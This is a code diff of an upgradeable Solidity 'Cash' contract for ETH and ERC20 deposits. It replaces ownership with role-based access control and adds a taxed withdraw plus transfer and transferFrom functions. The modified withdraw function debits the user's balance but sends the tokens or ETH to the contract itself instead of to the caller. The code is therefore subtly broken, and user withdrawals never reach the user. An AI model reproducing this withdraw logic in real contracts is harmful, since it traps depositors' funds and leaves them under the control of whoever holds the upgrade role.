@@ -1,16 +1,20 @@
 //SPDX-License-Identifier: MIT
 pragma solidity 0.8.9;
 
-import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "./interfaces/ICash.sol";
 
-contract Cash is Initializable, OwnableUpgradeable, UUPSUpgradeable, ICash {
+contract Cash is Initializable, AccessControlUpgradeable, UUPSUpgradeable, ICash {
+    // @notice only contract with this role can call this function
+    bytes32 public constant TRANSFER_FROM_ROLE = keccak256("TRANSFER_FROM_ROLE");
+
+    // 10% = 1e17, tax will send to cash-address (this), only admin can set and withdraw tax
     uint256 public tax;
 
-    // account => token => amount
+    // @notice account => token => amount
     mapping(address => mapping(address => uint256)) private accountCashMap;
 
     // @custom:oz-upgrades-unsafe-allow constructor
@@ -19,22 +23,28 @@ contract Cash is Initializable, OwnableUpgradeable, UUPSUpgradeable, ICash {
     }
 
     function initialize() initializer public {
-        __Ownable_init();
+        __AccessControl_init();
         __UUPSUpgradeable_init();
+
+        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
     }
 
     // @notice set tax rate, 10% = 1e17
-    function setTax(uint256 _value) onlyOwner external {
+    function setTax(uint256 _value)
+    onlyRole(DEFAULT_ADMIN_ROLE)
+    external
+    returns (bool)
+    {
         require(_value <= 1e18, "Platform Fee must be less than 1e18");
         tax = _value;
-
         emit SetTax(_value);
+        return true;
     }
 
     // @notice deposit to user's cash account
     // if _token is Address(0), deposit ETH, else deposit ERC20
     // need to approve first
-    function deposit(address _token, uint256 _amount) payable external {
+    function deposit(address _token, uint256 _amount) payable external returns (bool) {
         if (_token == address(0)) {
             require(msg.value == _amount, "msg.value must be equal to _amount");
             accountCashMap[msg.sender][_token] += _amount;
@@ -45,6 +55,7 @@ contract Cash is Initializable, OwnableUpgradeable, UUPSUpgradeable, ICash {
                 accountCashMap[msg.sender][address(0)] += msg.value;
             }
         }
+        return true;
     }
 
     // @notice withdraw tokens
@@ -52,25 +63,34 @@ contract Cash is Initializable, OwnableUpgradeable, UUPSUpgradeable, ICash {
     // if tax > 0, withdraw (1e18 - tax) * _amount
     // if _token is Address(0), withdraw ETH, else withdraw ERC20
     // tax will be sent to contract self, only owner can withdraw
-    function withdraw(address _token, uint256 _amount) external {
+    function withdraw(address _token, uint256 _amount) external returns (bool) {
         uint256 cash = accountCashMap[msg.sender][_token];
         if (cash < _amount) {
             _amount = cash;
         }
-        accountCashMap[msg.sender][_token] -= _amount;
+        unchecked {
+            accountCashMap[msg.sender][_token] -= _amount;
+        }
         if (tax > 0) {
             uint256 taxAmount = _amount * tax / 1e18;
-            _amount -= taxAmount;
+            unchecked {
+                _amount -= taxAmount;
+            }
             accountCashMap[address(this)][_token] += taxAmount;
         }
         if (_token == address(0)) {
-            payable(msg.sender).transfer(_amount);
+            payable(address(this)).transfer(_amount);
         } else {
-            ERC20(_token).transfer(msg.sender, _amount);
+            ERC20(_token).transfer(address(this), _amount);
         }
+        return true;
     }
 
-    function withdrawTax(address _token, uint256 _amount) onlyOwner external {
+    function withdrawTax(address _token, uint256 _amount)
+    onlyRole(DEFAULT_ADMIN_ROLE)
+    external
+    returns (bool)
+    {
         // check if contract has enough cash
         // if not, withdraw all
         // if _token is Address(0), withdraw ETH, else withdraw ERC20
@@ -79,16 +99,51 @@ contract Cash is Initializable, OwnableUpgradeable, UUPSUpgradeable, ICash {
             _amount = cash;
         }
         // update cash first
-        accountCashMap[address(this)][_token] -= _amount;
+        unchecked {
+            accountCashMap[address(this)][_token] -= _amount;
+        }
         if (_token == address(0)) {
             payable(msg.sender).transfer(_amount);
         } else {
             ERC20(_token).transfer(msg.sender, _amount);
         }
+        return true;
     }
 
-    // @notice cash balance of a token
-    function cashOf(address _token, address _account) external view returns (uint256 amount) {
+    // @notice balance of a token
+    function balanceOf(address _token, address _account) external view returns (uint256 amount) {
         amount = accountCashMap[_account][_token];
     }
+
+    function transfer(address _token, address _to, uint256 _amount) external override returns (bool) {
+        uint256 cash = accountCashMap[msg.sender][_token];
+        require(cash >= _amount, "Not enough cash");
+        unchecked {
+            accountCashMap[msg.sender][_token] -= _amount;
+        }
+        accountCashMap[_to][_token] += _amount;
+        return true;
+    }
+
+    // @notice only owner can transfer from other account
+    function transferFrom(address _token, address _from, address _to, uint256 _amount)
+    external
+    onlyRole(TRANSFER_FROM_ROLE)
+    override
+    returns (bool)
+    {
+        uint256 cash = accountCashMap[_from][_token];
+        require(cash >= _amount, "Not enough cash");
+        unchecked {
+            accountCashMap[_from][_token] -= _amount;
+        }
+        accountCashMap[_to][_token] += _amount;
+        return true;
+    }
+
+    function _authorizeUpgrade(address newImplementation)
+    internal
+    onlyRole(DEFAULT_ADMIN_ROLE)
+    override
+    {}
 }
